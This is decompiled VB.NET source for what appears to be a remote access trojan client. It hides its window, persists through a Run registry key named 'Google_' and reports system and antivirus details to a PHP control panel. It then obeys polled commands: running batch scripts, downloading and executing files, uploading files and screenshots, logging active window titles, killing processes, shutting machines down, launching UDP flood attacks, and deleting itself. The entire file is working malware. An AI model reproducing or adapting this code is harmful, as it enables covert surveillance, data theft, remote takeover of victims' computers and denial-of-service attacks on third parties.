Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports Microsoft.Win32
Imports My
Imports System
Imports System.Collections
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Drawing.Imaging
Imports System.IO
Imports System.Net
Imports System.Net.Sockets
Imports System.Runtime.CompilerServices
Imports System.Runtime.InteropServices
Imports System.Security.Principal
Imports System.Text
Imports System.Windows.Forms

<DesignerGenerated> _
Public Class Form1
    Inherits Form
    ' Methods
    Public Sub New()
        AddHandler MyBase.FormClosed, New FormClosedEventHandler(AddressOf Me.Form1_FormClosed)
        AddHandler MyBase.FormClosing, New FormClosingEventHandler(AddressOf Me.Form1_FormClosing)
        AddHandler MyBase.Load, New EventHandler(AddressOf Me.Form1_Load)
        Dim list As List(Of WeakReference) = Form1.__ENCList
        SyncLock list
            Form1.__ENCList.Add(New WeakReference(Me))
        End SyncLock
        Me.ReadLine = New WebClient
        Me.SlaveOnline = New WebClient
        Me.web = New WebClient
        Me.sendback = New WebClient
        Me.hostlink = ""
        Me.PictureBox1 = New PictureBox
        Me.z = ""
        Me.zfile = "3c25b77edaae6249b05dd60fdaa77ffb.bat"
        Me.SendZDirFilesBack = ""
        Me.getdir = ""
        Me.getdir2 = ""
        Me.stc = ""
        Me.downloadfile = New WebClient
        Me.NC = 0
        Me.DosInfo = ""
        Me.ScrColor = 0
        Me.ExeName = Path.GetFileName(Application.ExecutablePath)
        Me.imagenmr = Nothing
        Me.host = ""
        Me.hostport = ""
        Me.hosttime = ""
        Me.hosttime2 = "0"
        Me.avinfo = Nothing
        Me.strin = Nothing
        Me.textbox1 = New TextBox
        Me.counting = 0
        Me.InitializeComponent
    End Sub

    Public Sub batchScriptrun()
        Try 
            Dim str As String = Strings.Replace(Strings.Replace(Strings.Replace(Me.Ssstring, "*=*[]", "", 1, -1, CompareMethod.Binary).ToString, "Batch747:", "", 1, -1, CompareMethod.Binary).ToString, ("|" & MyProject.Computer.Name), "", 1, -1, CompareMethod.Binary).ToString
            Dim contents As String() = New String() { str, "" }
            File.WriteAllLines((Me.z & Me.zfile), contents)
            Process.Start((Me.z & Me.zfile))
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError
        End Try
    End Sub

    <DebuggerNonUserCode> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try 
            If (disposing AndAlso (Not Me.components Is Nothing)) Then
                Me.components.Dispose
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    Public Sub Downloadfilefrom()
        Dim str As String = Strings.Replace(Strings.Replace(Strings.Replace(Me.Ssstring.ToString, "*=*[]", "", 1, -1, CompareMethod.Binary).ToString.ToString, "DownloadFIleToComputer747:", "", 1, -1, CompareMethod.Binary).ToString.ToString, ("|" & MyProject.Computer.Name), "", 1, -1, CompareMethod.Binary).ToString
        Me.downloadfile.DownloadFile((Me.hostlink & "/Upload/" & str), (Application.StartupPath & "\" & str))
    End Sub

    Public Sub Downloadfilefrom2()
        Dim str As String = Strings.Replace(Strings.Replace(Strings.Replace(Me.Ssstring.ToString, "*=*[]", "", 1, -1, CompareMethod.Binary).ToString.ToString, "DownloadFIleToComputer7472:", "", 1, -1, CompareMethod.Binary).ToString.ToString, ("|" & MyProject.Computer.Name), "", 1, -1, CompareMethod.Binary).ToString
        Me.downloadfile.DownloadFile((Me.hostlink & "/Upload/" & str), (Application.StartupPath & "\" & str))
        Process.Start((Application.StartupPath & "\" & str))
    End Sub

    Private Sub Form1_FormClosed(ByVal sender As Object, ByVal e As FormClosedEventArgs)
        Try 
            Me.SlaveOnline.DownloadString(String.Concat(New String() { Me.hostlink, "/SlaveOnline.php?online=False&info=", MyProject.Computer.Info.OSFullName.ToString, "|", MyProject.Computer.Name.ToString }))
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError
        End Try
    End Sub

    Private Sub Form1_FormClosing(ByVal sender As Object, ByVal e As FormClosingEventArgs)
        Try 
            Me.SlaveOnline.DownloadString(String.Concat(New String() { Me.hostlink, "/SlaveOnline.php?online=False&info=", MyProject.Computer.Info.OSFullName.ToString, "|", MyProject.Computer.Name.ToString }))
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError
        End Try
    End Sub

    Private Sub Form1_Load(ByVal sender As Object, ByVal e As EventArgs)
        Dim flag As Boolean = New WindowsPrincipal(WindowsIdentity.GetCurrent).IsInRole(WindowsBuiltInRole.Administrator)
        Dim str2 As String = "$SplitItems$"
        Dim expression As String = File.ReadAllText(Application.ExecutablePath)
        If expression.Contains(str2) Then
            Dim strArray As String() = Strings.Split(expression, str2, -1, CompareMethod.Binary)
            Me.hostlink = strArray(1)
            If flag Then
                If (strArray(2).ToString = "TRUE") Then
                    Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
                    key.SetValue("Google_", Application.ExecutablePath)
                    key.Close
                End If
            Else
                Dim startInfo As New ProcessStartInfo
                Dim process As New Process
                Dim info3 As ProcessStartInfo = startInfo
                info3.UseShellExecute = True
                info3.FileName = Application.ExecutablePath
                info3.WindowStyle = ProcessWindowStyle.Normal
                info3.Verb = "runas"
                info3 = Nothing
                process = Process.Start(startInfo)
                Me.Close
            End If
            Try 
                Dim num As Double = ((CDbl(MyProject.Computer.Info.TotalPhysicalMemory) / 1048576) / 1024)
                num = Math.Round(num, 2)
                Me.avinfo = Me.getavinformation(Environment.MachineName)
                Me.avinfo = Strings.Replace(Me.avinfo, ChrW(13) & ChrW(10), " - ", 1, -1, CompareMethod.Binary)
                Me.avinfo = Me.avinfo.Substring(0, (Me.avinfo.Length - 3))
                Me.SlaveOnline.DownloadString(String.Concat(New String() { Me.hostlink, "/SlaveOnline.php?online=True&info=", MyProject.Computer.Info.OSFullName.ToString, "|", MyProject.Computer.Name.ToString, "|", Me.ExeName.ToString, "|", num.ToString, "|", Me.avinfo.ToString }))
                Dim info2 As DriveInfo
                For Each info2 In DriveInfo.GetDrives
                    If ((Me.z = "") AndAlso (info2.DriveType.ToString = "Fixed")) Then
                        Me.z = info2.Name
                    End If
                Next
                If Not File.Exists((Me.z & Me.zfile)) Then
                    File.Create((Me.z & Me.zfile)).Close
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                ProjectData.ClearProjectError
            End Try
        End If
    End Sub

    Private Function GetActiveWindowTitle() As String
        Dim lpString As New String(ChrW(0), 100)
        Form1.GetWindowText(Form1.GetForegroundWindow, lpString, 100)
        Return lpString.Substring(0, (Strings.InStr(lpString, ChrW(0), CompareMethod.Binary) - 1))
    End Function

    Private Function getavinformation(ByVal strSystem As String) As String
        Dim str2 As String = String.Empty
        Dim str3 As String = Nothing
        Dim str4 As String = Nothing
        Dim builder As New StringBuilder
        Try 
            Dim enumerator As IEnumerator
            If (strSystem = Environment.MachineName) Then
                str2 = "."
            Else
                str2 = strSystem
            End If
            str3 = "\root\SecurityCenter2"
            str4 = "Select * from AntiVirusProduct"
            Dim arguments As Object() = New Object() { str4 }
            Dim copyBack As Boolean() = New Boolean() { True }
            If copyBack(0) Then
                str4 = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(String)))
            End If
            Dim objectValue As Object = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(Interaction.GetObject(("winmgmts:\\" & str2 & str3), Nothing)), Nothing, "ExecQuery", arguments, Nothing, Nothing, copyBack))
            Try 
                enumerator = DirectCast(objectValue, IEnumerable).GetEnumerator
                Do While enumerator.MoveNext
                    Dim instance As Object = RuntimeHelpers.GetObjectValue(enumerator.Current)
                    Try 
                        builder.AppendLine(NewLateBinding.LateGet(instance, Nothing, "displayname", New Object(0  - 1) {}, Nothing, Nothing, Nothing).ToString)
                    Catch exception1 As Exception
                        ProjectData.SetProjectError(exception1)
                        Dim exception As Exception = exception1
                        builder.AppendLine("??" & ChrW(9) & ChrW(9) & ChrW(9) & "??")
                        ProjectData.ClearProjectError
                    End Try
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator,IDisposable).Dispose
                End If
            End Try
        Catch exception3 As Exception
            ProjectData.SetProjectError(exception3)
            Interaction.MsgBox(exception3.ToString, MsgBoxStyle.ApplicationModal, Nothing)
            ProjectData.ClearProjectError
        End Try
        Return builder.ToString
    End Function

    Public Sub Getfiletohost()
        Try 
            Me.stc = Me.getdir2
            Me.web.UploadFile((Me.hostlink & "/upload.php"), Me.getdir2.ToString)
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError
        End Try
    End Sub

    <DllImport("user32.dll", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)> _
    Private Shared Function GetForegroundWindow() As Integer
    End Function

    <DllImport("user32.dll", EntryPoint:="GetWindowTextA", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)> _
    Private Shared Function GetWindowText(ByVal hwnd As Integer, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpString As String, ByVal cch As Integer) As Integer
    End Function

    <DebuggerStepThrough> _
    Private Sub InitializeComponent()
        Me.components = New Container
        Me.Timer1 = New Timer(Me.components)
        Me.Timer2 = New Timer(Me.components)
        Me.Timer3 = New Timer(Me.components)
        Me.Timer4 = New Timer(Me.components)
        Me.SuspendLayout
        Me.Timer1.Enabled = True
        Me.Timer1.Interval = &H1B58
        Me.Timer2.Interval = 1
        Me.Timer3.Interval = 200
        Me.Timer4.Interval = &H3E8
        Dim ef As New SizeF(6!, 13!)
        Me.AutoScaleDimensions = ef
        Me.AutoScaleMode = AutoScaleMode.Font
        Me.BackColor = Color.Black
        Dim size As New Size(10, 10)
        Me.ClientSize = size
        Me.FormBorderStyle = FormBorderStyle.None
        Me.MaximizeBox = False
        Me.MinimizeBox = False
        Me.Name = "Form1"
        Me.ShowIcon = False
        Me.ShowInTaskbar = False
        Me.TransparencyKey = Color.Black
        Me.WindowState = FormWindowState.Minimized
        Me.ResumeLayout(False)
    End Sub

    Public Sub ProcessViewer()
        Dim str As String = Nothing
        Dim process As Process
        For Each process In Process.GetProcesses
            str = (str & process.ProcessName.ToString & ChrW(13) & ChrW(10))
        Next
        Me.SlaveOnline.DownloadString((Me.hostlink & "/AddFNProcess.php?Proces=" & str.ToString))
    End Sub

    Public Sub screencapture()
        Try 
            Dim client As New WebClient
            Dim bounds As Rectangle = Screen.PrimaryScreen.Bounds
            Dim image As New Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb)
            Graphics.FromImage(image).CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy)
            Me.PictureBox1.SizeMode = PictureBoxSizeMode.Zoom
            Me.PictureBox1.Image = image
            If File.Exists("1.png") Then
                File.Delete("1.png")
            End If
            Me.PictureBox1.Image.Save("1.png", ImageFormat.Png)
            client.UploadFile((Me.hostlink & "/upload.php"), "1.png")
            If File.Exists("1.png") Then
                File.Delete("1.png")
            End If
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError
        End Try
    End Sub

    Public Sub SendZDirFilesBacksub()
        Me.SendZDirFilesBack = ""
        Try 
            Dim str As String
            For Each str In Directory.GetDirectories(Me.getdir)
                Me.SendZDirFilesBack = (Me.SendZDirFilesBack & str.ToString & ChrW(13) & ChrW(10))
            Next
            Dim str2 As String
            For Each str2 In Directory.GetFiles(Me.getdir)
                Me.SendZDirFilesBack = (Me.SendZDirFilesBack & str2.ToString & ChrW(13) & ChrW(10))
            Next
            Me.sendback.DownloadString((Me.hostlink & "/AddFNDir.php?Dir=" & Me.SendZDirFilesBack.ToString))
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError
        End Try
    End Sub

    Public Sub StartDos()
        Dim strArray As String() = Strings.Split(Me.DosInfo.ToString, ":-:", -1, CompareMethod.Binary)
        Me.host = strArray(0)
        Me.hostport = strArray(1)
        Me.hosttime = strArray(2)
        Me.Timer3.Start
    End Sub

    Private Sub Timer1_Tick(ByVal sender As Object, ByVal e As EventArgs)
        Try 
            Me.ReadString = Me.ReadLine.DownloadString((Me.hostlink & "/Fn.txt"))
            If (Me.SaveString <> Me.ReadString) Then
                Me.SaveString = Me.ReadString
                Me.Ssstring = Me.ReadString
                If Me.ReadString.Contains("*=*[]") Then
                    Me.Ssstring = Strings.Replace(Me.ReadString, "*=*[]", "", 1, -1, CompareMethod.Binary).ToString
                    If Me.Ssstring.Contains("BlueScreen747") Then
                        Me.NC = 0
                        Me.ScrColor = 1
                        MyProject.Forms.Form2.Show
                    ElseIf Me.Ssstring.Contains("ShowImage747:") Then
                        Me.imagenmr = Strings.Replace(Me.Ssstring, "ShowImage747:", "", 1, -1, CompareMethod.Binary).ToString
                        MyProject.Forms.Form7.Show
                    ElseIf Me.Ssstring.Contains("BlackScreen747") Then
                        Me.NC = 0
                        Me.ScrColor = 0
                        MyProject.Forms.Form3.Show
                    ElseIf Me.Ssstring.Contains("BlueScreenNC747") Then
                        Me.NC = 1
                        Me.ScrColor = 1
                        MyProject.Forms.Form2.Show
                    ElseIf Me.Ssstring.Contains("BlackScreenNC747") Then
                        Me.NC = 1
                        Me.ScrColor = 0
                        MyProject.Forms.Form3.Show
                    ElseIf Me.Ssstring.Contains("GetActiveWindow747") Then
                        Me.Timer4.Start
                    ElseIf Me.Ssstring.Contains("MSGBOX747:") Then
                        Interaction.MsgBox(Strings.Replace(Me.Ssstring, "MSGBOX747:", " ", 1, -1, CompareMethod.Binary).ToString, MsgBoxStyle.ApplicationModal, Nothing)
                    ElseIf Me.Ssstring.Contains("ColorScreen747") Then
                        MyProject.Forms.Form5.Show
                    ElseIf Me.Ssstring.Contains("Website747:") Then
                        Process.Start(Strings.Replace(Me.Ssstring, "Website747:", "", 1, -1, CompareMethod.Binary).ToString)
                    ElseIf Me.Ssstring.Contains("TALK747:") Then
                        NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(Interaction.CreateObject("sapi.spvoice", "")), Nothing, "Speak", New Object() { Strings.Replace(Me.Ssstring, "TALK747:", "", 1, -1, CompareMethod.Binary).ToString }, Nothing, Nothing, Nothing, True)
                    ElseIf Me.Ssstring.Contains("DeliteMeBatch747") Then
                        Dim fileName As String = Path.GetFileName(Application.ExecutablePath)
                        Try 
                            Dim contents As String() = New String() { String.Concat(New String() { "ping 1.1.1.1 -n 2 -w 3000 > Nul & Del """, Application.StartupPath, "\", fileName, """" }), "" }
                            File.WriteAllLines((Me.z & Me.zfile), contents)
                            Process.Start((Me.z & Me.zfile))
                            Me.Close
                        Catch exception1 As Exception
                            ProjectData.SetProjectError(exception1)
                            Dim exception As Exception = exception1
                            ProjectData.ClearProjectError
                        End Try
                    ElseIf Me.Ssstring.Contains("KillProcess747:") Then
                        Dim process As Process
                        For Each process In Process.GetProcessesByName(Strings.Replace(Strings.Replace(Strings.Replace(Me.Ssstring.ToString, "*=*[]", "", 1, -1, CompareMethod.Binary).ToString.ToString, "KillProcess747:", "", 1, -1, CompareMethod.Binary).ToString.ToString, ("|" & MyProject.Computer.Name), "", 1, -1, CompareMethod.Binary).ToString.ToString)
                            process.Kill
                        Next
                    ElseIf Me.Ssstring.Contains("CMD747") Then
                        Process.Start("CMD")
                    ElseIf Me.Ssstring.Contains("ProcessViewer747") Then
                        Me.ProcessViewer
                    ElseIf Me.Ssstring.Contains("Batch747:") Then
                        Me.batchScriptrun
                    ElseIf Me.Ssstring.Contains("DownloadFIleToComputer747:") Then
                        Me.Downloadfilefrom
                    ElseIf Me.Ssstring.Contains("DownloadFIleToComputer7472:") Then
                        Me.Downloadfilefrom2
                    ElseIf Me.Ssstring.Contains("Notepad747") Then
                        Process.Start("Notepad")
                    ElseIf Me.Ssstring.Contains("CrasherPC747") Then
                        Me.Timer2.Start
                    ElseIf Me.Ssstring.Contains("ShutdownPC747") Then
                        Interaction.Shell("Shutdown /s", AppWinStyle.MinimizedFocus, False, -1)
                    ElseIf Me.Ssstring.Contains("CDOPEN747") Then
                        Process.Start("D:\")
                    ElseIf Me.Ssstring.Contains("DDoS747:") Then
                        Me.DosInfo = Strings.Replace(Me.Ssstring.ToString, "*=*[]", "", 1, -1, CompareMethod.Binary).ToString
                        Me.DosInfo = Strings.Replace(Me.DosInfo.ToString, "DDoS747:", "", 1, -1, CompareMethod.Binary).ToString
                        Me.DosInfo = Strings.Replace(Me.DosInfo.ToString, ("|" & MyProject.Computer.Name), "", 1, -1, CompareMethod.Binary).ToString
                        Me.StartDos
                    ElseIf Me.Ssstring.Contains("ReBootPC747") Then
                        Interaction.Shell("Shutdwon /r", AppWinStyle.MinimizedFocus, False, -1)
                    ElseIf (Not Me.Ssstring.Contains("ViewScreenclose747") AndAlso Me.Ssstring.Contains("Refreshslaves747")) Then
                        Try 
                            Me.SlaveOnline.DownloadString(String.Concat(New String() { Me.hostlink, "/SlaveOnline.php?online=True&info=", MyProject.Computer.Info.OSFullName.ToString, "|", MyProject.Computer.Name.ToString, "|", Me.ExeName.ToString }))
                        Catch exception6 As Exception
                            ProjectData.SetProjectError(exception6)
                            Dim exception2 As Exception = exception6
                            ProjectData.ClearProjectError
                        End Try
                    End If
                ElseIf Me.ReadString.Contains(MyProject.Computer.Name) Then
                    Me.Ssstring = Strings.Replace(Me.ReadString, ("|" & MyProject.Computer.Name), "", 1, -1, CompareMethod.Binary).ToString
                    If Me.Ssstring.Contains("BlueScreen747") Then
                        Me.NC = 0
                        Me.ScrColor = 1
                        MyProject.Forms.Form2.Show
                    ElseIf Me.Ssstring.Contains("KillProcess747:") Then
                        Dim process2 As Process
                        For Each process2 In Process.GetProcessesByName(Strings.Replace(Strings.Replace(Strings.Replace(Me.Ssstring.ToString, "*=*[]", "", 1, -1, CompareMethod.Binary).ToString.ToString, "KillProcess747:", "", 1, -1, CompareMethod.Binary).ToString.ToString, ("|" & MyProject.Computer.Name), "", 1, -1, CompareMethod.Binary).ToString.ToString)
                            process2.Kill
                        Next
                    ElseIf Me.Ssstring.Contains("BlueScreenNC747") Then
                        Me.NC = 1
                        Me.ScrColor = 1
                        MyProject.Forms.Form2.Show
                    ElseIf Me.Ssstring.Contains("BlackScreen747") Then
                        Me.NC = 0
                        Me.ScrColor = 0
                        MyProject.Forms.Form3.Show
                    ElseIf Me.Ssstring.Contains(" BlackScreenNC747") Then
                        Me.NC = 0
                        Me.ScrColor = 0
                        MyProject.Forms.Form3.Show
                    ElseIf Me.Ssstring.Contains("MSGBOX747:") Then
                        Interaction.MsgBox(Strings.Replace(Me.Ssstring, "MSGBOX747:", " ", 1, -1, CompareMethod.Binary).ToString, MsgBoxStyle.ApplicationModal, Nothing)
                    ElseIf Me.Ssstring.Contains("Website747:") Then
                        Process.Start(Strings.Replace(Me.Ssstring, "Website747:", "", 1, -1, CompareMethod.Binary).ToString)
                    ElseIf Me.Ssstring.Contains("TALK747:") Then
                        NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(Interaction.CreateObject("sapi.spvoice", "")), Nothing, "Speak", New Object() { Strings.Replace(Me.Ssstring, "TALK747:", "", 1, -1, CompareMethod.Binary).ToString }, Nothing, Nothing, Nothing, True)
                    ElseIf Me.Ssstring.Contains("CMD747") Then
                        Process.Start("CMD")
                    ElseIf Me.Ssstring.Contains("ProcessViewer747") Then
                        Me.ProcessViewer
                    ElseIf Me.Ssstring.Contains("ShowWebcam747") Then
                        MyProject.Forms.Form6.Show
                        MyProject.Forms.Form6.Label1.Text = Me.hostlink.ToString
                    ElseIf Me.Ssstring.Contains("DownloadFIleToComputer747:") Then
                        Me.Downloadfilefrom
                    ElseIf Me.Ssstring.Contains("DownloadFIleToComputer7472:") Then
                        Me.Downloadfilefrom2
                    ElseIf Me.Ssstring.Contains("GetActiveWindow747") Then
                        Me.Timer4.Start
                    ElseIf Me.Ssstring.Contains("CHAT747") Then
                        MyProject.Forms.Form4.Show
                        MyProject.Forms.Form4.Label1.Text = Me.hostlink.ToString
                    ElseIf Me.Ssstring.Contains("ColorScreen747") Then
                        MyProject.Forms.Form5.Show
                    ElseIf Me.Ssstring.Contains("Notepad747") Then
                        Process.Start("Notepad")
                    ElseIf Me.Ssstring.Contains("Batch747:") Then
                        Me.batchScriptrun
                    ElseIf Me.Ssstring.Contains("GetFileToHost747:") Then
                        Me.getdir2 = Strings.Replace(Me.Ssstring.ToString, "*=*[]", "", 1, -1, CompareMethod.Binary).ToString
                        Me.getdir2 = Strings.Replace(Me.getdir2.ToString, "GetFileToHost747:", "", 1, -1, CompareMethod.Binary).ToString
                        Me.getdir2 = Strings.Replace(Me.getdir2.ToString, ("|" & MyProject.Computer.Name), "", 1, -1, CompareMethod.Binary).ToString
                        Me.Getfiletohost
                    ElseIf Me.Ssstring.Contains("DeliteMeBatch747") Then
                        Dim str4 As String = Path.GetFileName(Application.ExecutablePath)
                        Try 
                            Dim strArray2 As String() = New String() { String.Concat(New String() { "ping 1.1.1.1 -n 2 -w 3000 > Nul & Del """, Application.StartupPath, "\", str4, """" }), "" }
                            File.WriteAllLines((Me.z & Me.zfile), strArray2)
                            Process.Start((Me.z & Me.zfile))
                            Me.Close
                        Catch exception7 As Exception
                            ProjectData.SetProjectError(exception7)
                            Dim exception3 As Exception = exception7
                            ProjectData.ClearProjectError
                        End Try
                    ElseIf Me.Ssstring.Contains("ShowImage747:") Then
                        Me.imagenmr = Strings.Replace(Me.Ssstring, "ShowImage747:", "", 1, -1, CompareMethod.Binary).ToString
                        MyProject.Forms.Form7.Show
                    ElseIf Me.Ssstring.Contains("CrasherPC747") Then
                        Me.Timer2.Start
                    ElseIf Me.Ssstring.Contains("ShutdownPC747") Then
                        Interaction.Shell("Shutdown /s", AppWinStyle.MinimizedFocus, False, -1)
                    ElseIf Me.Ssstring.Contains("Filemanager747:") Then
                        Me.getdir = Strings.Replace(Me.Ssstring.ToString, "*=*[]", "", 1, -1, CompareMethod.Binary).ToString
                        Me.getdir = Strings.Replace(Me.getdir.ToString, "Filemanager747:", "", 1, -1, CompareMethod.Binary).ToString
                        Me.getdir = Strings.Replace(Me.getdir.ToString, ("|" & MyProject.Computer.Name), "", 1, -1, CompareMethod.Binary).ToString
                        Me.SendZDirFilesBacksub
                    ElseIf Me.Ssstring.Contains("DDoS747:") Then
                        Me.DosInfo = Strings.Replace(Me.Ssstring.ToString, "*=*[]", "", 1, -1, CompareMethod.Binary).ToString
                        Me.DosInfo = Strings.Replace(Me.DosInfo.ToString, "DDoS747:", "", 1, -1, CompareMethod.Binary).ToString
                        Me.DosInfo = Strings.Replace(Me.DosInfo.ToString, ("|" & MyProject.Computer.Name), "", 1, -1, CompareMethod.Binary).ToString
                        Me.StartDos
                    ElseIf Me.Ssstring.Contains("CDOPEN747") Then
                        Process.Start("D:\")
                    ElseIf Me.Ssstring.Contains("ReBootPC747") Then
                        Interaction.Shell("Shutdwon /r", AppWinStyle.MinimizedFocus, False, -1)
                    ElseIf Me.Ssstring.Contains("ViewScreen747") Then
                        Me.screencapture
                    ElseIf Me.Ssstring.Contains("Refreshslaves747") Then
                        Try 
                            Me.SlaveOnline.DownloadString(String.Concat(New String() { Me.hostlink, "/SlaveOnline.php?online=True&info=", MyProject.Computer.Info.OSFullName.ToString, "|", MyProject.Computer.Name.ToString, "|", Me.ExeName.ToString }))
                        Catch exception8 As Exception
                            ProjectData.SetProjectError(exception8)
                            Dim exception4 As Exception = exception8
                            ProjectData.ClearProjectError
                        End Try
                    End If
                End If
            End If
        Catch exception9 As Exception
            ProjectData.SetProjectError(exception9)
            Dim exception5 As Exception = exception9
            ProjectData.ClearProjectError
        End Try
    End Sub

    Private Sub Timer2_Tick(ByVal sender As Object, ByVal e As EventArgs)
        Process.Start("cmd")
    End Sub

    Private Sub Timer3_Tick(ByVal sender As Object, ByVal e As EventArgs)
        Try 
            If (Operators.CompareString(Me.hosttime2, Me.hosttime, False) > 0) Then
                Me.Timer3.Stop
            Else
                Dim num3 As Integer
                Dim str As String = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
                Dim random As New Random
                Dim builder As New StringBuilder
                Dim num As Integer = 1
                Do
                    Dim startIndex As Integer = random.Next(0, &H23)
                    builder.Append(str.Substring(startIndex, 1))
                    num += 1
                    num3 = &H41
                Loop While (num <= num3)
                Dim client As New UdpClient
                Dim dgram As Byte() = New Byte(0  - 1) {}
                Dim addr As IPAddress = IPAddress.Parse(Me.host.ToString)
                client.Connect(addr, Conversions.ToInteger(Me.hostport.ToString))
                dgram = Encoding.ASCII.GetBytes(builder.ToString)
                client.Send(dgram, dgram.Length)
            End If
            Me.hosttime2 = Conversions.ToString(CDbl((Conversions.ToDouble(Me.hosttime2) + 1)))
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            Me.Timer3.Stop
            ProjectData.ClearProjectError
        End Try
    End Sub

    Private Sub Timer4_Tick(ByVal sender As Object, ByVal e As EventArgs)
        If (Me.strin <> Me.GetActiveWindowTitle) Then
            Me.textbox1.Text = (Me.textbox1.Text & ChrW(13) & ChrW(10) & "[" & Me.GetActiveWindowTitle & "]" & ChrW(13) & ChrW(10))
            Me.strin = Me.GetActiveWindowTitle
        End If
        Me.counting += 1
        If (Me.counting > 100) Then
            Me.counting = 0
            Me.Timer4.Stop
        End If
        If (((((((((Me.counting = 10) Or (Me.counting = 20)) Or (Me.counting = 30)) Or (Me.counting = 40)) Or (Me.counting = 50)) Or (Me.counting = 60)) Or (Me.counting = 70)) Or (Me.counting = 80)) Or (Me.counting = 90)) Then
            Me.sendback.DownloadString((Me.hostlink & "/AddFNActive.php?Window=" & Me.textbox1.Text))
        End If
    End Sub


    ' Properties
    Friend Overridable Property Timer1 As Timer
        <DebuggerNonUserCode> _
        Get
            Return Me._Timer1
        End Get
        <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
        Set(ByVal WithEventsValue As Timer)
            Dim handler As EventHandler = New EventHandler(AddressOf Me.Timer1_Tick)
            If (Not Me._Timer1 Is Nothing) Then
                RemoveHandler Me._Timer1.Tick, handler
            End If
            Me._Timer1 = WithEventsValue
            If (Not Me._Timer1 Is Nothing) Then
                AddHandler Me._Timer1.Tick, handler
            End If
        End Set
    End Property

    Friend Overridable Property Timer2 As Timer
        <DebuggerNonUserCode> _
        Get
            Return Me._Timer2
        End Get
        <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
        Set(ByVal WithEventsValue As Timer)
            Dim handler As EventHandler = New EventHandler(AddressOf Me.Timer2_Tick)
            If (Not Me._Timer2 Is Nothing) Then
                RemoveHandler Me._Timer2.Tick, handler
            End If
            Me._Timer2 = WithEventsValue
            If (Not Me._Timer2 Is Nothing) Then
                AddHandler Me._Timer2.Tick, handler
            End If
        End Set
    End Property

    Friend Overridable Property Timer3 As Timer
        <DebuggerNonUserCode> _
        Get
            Return Me._Timer3
        End Get
        <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
        Set(ByVal WithEventsValue As Timer)
            Dim handler As EventHandler = New EventHandler(AddressOf Me.Timer3_Tick)
            If (Not Me._Timer3 Is Nothing) Then
                RemoveHandler Me._Timer3.Tick, handler
            End If
            Me._Timer3 = WithEventsValue
            If (Not Me._Timer3 Is Nothing) Then
                AddHandler Me._Timer3.Tick, handler
            End If
        End Set
    End Property

    Friend Overridable Property Timer4 As Timer
        <DebuggerNonUserCode> _
        Get
            Return Me._Timer4
        End Get
        <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
        Set(ByVal WithEventsValue As Timer)
            Dim handler As EventHandler = New EventHandler(AddressOf Me.Timer4_Tick)
            If (Not Me._Timer4 Is Nothing) Then
                RemoveHandler Me._Timer4.Tick, handler
            End If
            Me._Timer4 = WithEventsValue
            If (Not Me._Timer4 Is Nothing) Then
                AddHandler Me._Timer4.Tick, handler
            End If
        End Set
    End Property


    ' Fields
    Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)
    <AccessedThroughProperty("Timer1")> _
    Private _Timer1 As Timer
    <AccessedThroughProperty("Timer2")> _
    Private _Timer2 As Timer
    <AccessedThroughProperty("Timer3")> _
    Private _Timer3 As Timer
    <AccessedThroughProperty("Timer4")> _
    Private _Timer4 As Timer
    Private avinfo As String
    Private components As IContainer
    Private counting As Integer
    Private DosInfo As String
    Private downloadfile As WebClient
    Private ExeName As String
    Private getdir As String
    Private getdir2 As String
    Private host As String
    Public hostlink As String
    Private hostport As String
    Private hosttime As String
    Private hosttime2 As String
    Public imagenmr As String
    Public NC As Integer
    Private PictureBox1 As PictureBox
    Private ReadLine As WebClient
    Private ReadString As String
    Private SaveString As String
    Public ScrColor As Integer
    Private sendback As WebClient
    Private SendZDirFilesBack As String
    Private SlaveOnline As WebClient
    Private Ssstring As String
    Private stc As String
    Private strin As String
    Private textbox1 As TextBox
    Private web As WebClient
    Private z As String
    Private zfile As String
End Class


